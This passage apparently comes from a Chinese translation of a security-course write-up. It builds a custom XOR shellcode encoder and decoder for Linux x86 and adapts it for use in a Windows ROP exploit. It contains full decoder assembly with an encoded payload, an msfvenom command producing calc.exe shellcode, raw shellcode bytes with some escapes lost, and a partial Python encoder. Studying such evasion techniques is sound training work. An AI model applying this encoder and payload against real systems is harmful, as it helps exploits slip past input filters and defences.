    mov [edi], al ;save (decode) to the same memory location as the encoded shellcode
当这个内存写入操作完成之后，相应的计数器以及指针的值会得到更新，为下一个数据块的异或处理做好准备。
    inc edi ;move decoded-pointer 1 byte onward 
    inc esi ;move encoded-pointer 1 byte onward inc ecx ;
    increment inner loop-counter
由于编码器将shellcode按3字节大小进行切割，并在开头部位添加一个随机的字节，最终生成4字节大小的数据块，因此解码器需要做相同的操作：将经过编码的shellcode按4字节进行切割。我们可以在ECX寄存器上使用CMP-JNE循环，通过一组异或指令完成这个任务：
    l0:
     mov al, [esi] ;get first byte from the encoded shellcode 
     mov bl, [esi+1] ;get second byte from the encoded shellcode 
     xor al, bl ;xor them (result is saved to eax) 
     mov [edi], al ;save (decode) to the same memory location as the encoded shellcode 
     inc edi ;move decoded-pointer 1 byte onward 
     inc esi ;move encoded-pointer 1 byte onward 
     inc ecx ;increment inner loop-counter 
     cmp cl, 0x3 ;dealing with 4byte-blocks! 
     jne l0
上述代码中，如果CL等于3（表明已经执行了3条异或操作），解码器可以再次增加ESI的值，然后接收下一个4字节大小的数据块。这意味着解码器“跳过”了上一个数据块的最后一个字节，因为解码器需要再次从随机的字节开始处理。我们还需要将EDX外部循环计数器加上0x4，以确保解码器能在合适的位置访问编码后的shellcode的尾部地址，而不会导致SISEGV错误：
    inc esi ;move encoded-pointer 1 byte onward 
    xor ecx, ecx ;clear inner loop-counter 
    add dx, 0x4 ;move outer loop-counter 4 bytes onward 
    cmp dx, len ;check whether the end of the shellcode is reached 
    jne l0
这两个循环都是用来遍历处理编码后的shellcode的4字节数据块，在同一个内存位置实时生成解码后的shellcode。大家是否还记得第一条PUSH指令？这条指令用来完成解码器的最后操作，调用解码后的shellcode：
    call [esp] ;execute decoded shellcode
因此，完整版的汇编语言开发的解码器如下所示：
    ; SLAE - Assignment #4: Custom Shellcode Encoder/Decoder (Linux/x86) 
    ; Author: Julien Ahrens (@MrTuxracer) 
    ; Website: http://www.rcesecurity.com
    global _start
    section .text 
    _start: 
        jmp getshellcode
    decoder: 
        pop esi ;pointer to shellcode 
        push esi ;save address of shellcode for later execution 
        mov edi, esi ;copy address of shellcode to edi to work with it
        xor eax, eax    ;clear first XOR-operand register
        xor ebx, ebx    ;clear second XOR-operand register
        xor ecx, ecx    ;clear inner loop-counter
        xor edx, edx    ;clear outer loop-counter
    loop0: 
        mov al, [esi] ;get first byte from the encoded shellcode 
        mov bl, [esi+1] ;get second byte from the encoded shellcode 
        xor al, bl ;xor them (result is saved to eax) 
        mov [edi], al ;save (decode) to the same memory location as the encoded shellcode 
        inc edi ;move decoded-pointer 1 byte onward 
        inc esi ;move encoded-pointer 1 byte onward 
        inc ecx ;increment inner loop-counter 
        cmp cl, 0x3 ;dealing with 4byte-blocks! 
        jne loop0
        inc esi         ;move encoded-pointer 1 byte onward
        xor ecx, ecx    ;clear inner loop-counter
        add dx, 0x4     ;move outer loop-counter 4 bytes onward
        cmp dx, len     ;check whether the end of the shellcode is reached
        jne loop0
        call [esp]      ;execute decoded shellcode
    get_shellcode: 
        call decoder shellcode: db 
        0x60,0x0a,0x6c,0x34,0xa6,0xcc,0xcd,0x96,0xf9,0xc8,0x3e,0x68,0xa6,0xf5,0x9f,0x9d,0x37,0xbe,0x5f,0x92,0x5d,0xdd,0x82,0x15,0xe4,0x77,0xc7,0xa1,0xdc,0x8a,0xec,0x84,0xe2,0xe7,0xde,0xb8,0x17,0x44,0xcd,0x2c,0x1d,0x77,0x67,0x36,0x18,0x4f,0xc6,0x27,0x55,0x98,0x18,0xa8,0x52,0x34,0x87,0x83,0xdc,0x8a,0xdd,0x54,0xa5,0x44,0x89,0x09,0xa6,0x16,0x70,0x33,0xe6,0xb0,0xe6,0xb1,0xbf,0x36,0xd7,0x1a,0x5b,0xdb,0x82,0xdb,0xea,0x5b,0x59,0xca,0x23,0x93,0xac,0x61,0x0d,0x8d,0xc4,0xbd,0xed,0x14,0xa4,0xaf,0xe0,0x88,0xa7,0x88,0x25,0x56,0x3e,0x56,0x63,0x4c,0x2e,0x47,0x5c,0x32,0xbb,0x58,0xc3,0x82,0x0b,0xc1,0xff,0x32,0xb2,0x22 
        len: equ $-shellcode
接下来我们可以给出一些演示案例。
**五、在Linux上执行Shellcode**
****
大家可以从我的Github仓库上下载脚本，完成obj导出以及编译过程：
你可以使用GDB来确认解码器是否正常工作。在解码过程的初始阶段，ESI指向的是编码后的shellcode：
在shellcode的尾部，我们可以发现调用shellcode的实际上是“call [esp]”指令，这段shellcode的解码过程准确无误：
因此，最后shellcode的执行过程也非常成功：
我们的成果已经得到证实。此时此刻，你可能已经注意到编码过程会将编码后的shellcode的大小增大将近一倍，当shellcode可存放的空间大小捉襟见肘时，你可能需要重点关注这个情况。
**六、在现实世界中实现Shellcode的跨平台执行**
****
上述演示过程非常顺利，因为整个过程完全运行在一个可控的环境中。现在，我们可以在现实的攻击场景中使用这个解码器。你可能对我之前做过的工作有所了解（可以参考[Easy
File Management Webserver](http://www.rcesecurity.com/2014/05/easy-file-management-web-server-v5-3-exploit-kung-fu/)的攻击过程），当时我使用了一个自定义的ROP利用工具来弹出一个calc.exe窗口。现在我们可以修改这个工具，以演示我们自定义的编码器以及解码器。
首先，我们需要一段“纯净版”的shellcode代码。非常幸运的是，msfvenom可以满足我们的需求：
    msfvenom -p windows/exec CMD=calc.exe -f python -e generic/none
从输出中我们可以看到文本形式的shellcode：
如果你在攻击工具中直接使用这段shellcode，那么它会导致整个攻击行动失败，因为这段代码中有大量不可用的字符（如0x00）。首先我们可以对这段shellcode进行编码，但我们需要确保所有不可用字符都经过处理，对于这段代码而言，这些字符为：0x00,
0x0a, 0x0b and 0x3b。
    #!/usr/bin/python
    #SLAE - Assignment #4: Custom Shellcode Encoder/Decoder
    #Author: Julien Ahrens (@MrTuxracer)
    #Website: http://www.rcesecurity.com
    from random import randint
    #powered by Metasploit
    #windows/exec CMD=calc.exe
    #msfvenom -p windows/exec CMD=calc.exe -f python -e generic/none
    #Encoder: Custom
    shellcode = "xfcxe8x82x00x00x00x60x89xe5x31xc0x64x8b" 
    shellcode += "x50x30x8bx52x0cx8bx52x14x8bx72x28x0fxb7" 
    shellcode += "x4ax26x31xffxacx3cx61x7cx02x2cx20xc1xcf" 
    shellcode += "x0dx01xc7xe2xf2x52x57x8bx52x10x8bx4ax3c" 
    shellcode += "x8bx4cx11x78xe3x48x01xd1x51x8bx59x20x01" 
    shellcode += "xd3x8bx49x18xe3x3ax49x8bx34x8bx01xd6x31" 
    shellcode += "xffxacxc1xcfx0dx01xc7x38xe0x75xf6x03x7d" 
    shellcode += "xf8x3bx7dx24x75xe4x58x8bx58x24x01xd3x66" 
    shellcode += "x8bx0cx4bx8bx58x1cx01xd3x8bx04x8bx01xd0" 
    shellcode += "x89x44x24x24x5bx5bx61x59x5ax51xffxe0x5f" 
    shellcode += "x5fx5ax8bx12xebx8dx5dx6ax01x8dx85xb2x00" 
    shellcode += "x00x00x50x68x31x8bx6fx87xffxd5xbbxf0xb5" 
    shellcode += "xa2x56x68xa6x95xbdx9dxffxd5x3cx06x7cx0a" 
    shellcode += "x80xfbxe0x75x05xbbx47x13x72x6fx6ax00x53" 
    shellcode += "xffxd5x63x61x6cx63x2ex65x78x65x00"
    badchars = ["x00","x0a","x0d","x3b"]
    def xorBytes(byteArray): 
        # Randomize first byte 
        rnd=randint(1,255) 
        xor1=(rnd ^ byteArray[0]) 
        xor2=(xor1 ^ byteArray[1]) 
        xor3=(xor2 ^ byteArray[2])
        xorArray=bytearray()
        xorArray.append(rnd)
        xorArray.append(xor1)